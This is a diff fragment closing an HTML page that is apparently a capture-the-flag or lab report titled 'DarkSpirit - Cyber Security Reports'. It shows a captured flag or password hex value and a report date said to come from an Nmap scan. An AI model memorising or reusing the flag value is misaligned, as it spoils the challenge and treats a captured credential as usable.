+                     <div class="flag-value"><span class="password">1B8EEA89EA92CECB931E3CC25AA8DE21</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap-Scan extrahiert -->
+        <p>Berichtsdatum: 24. November 2022</p>
+    </footer>
+</body>
+</html>
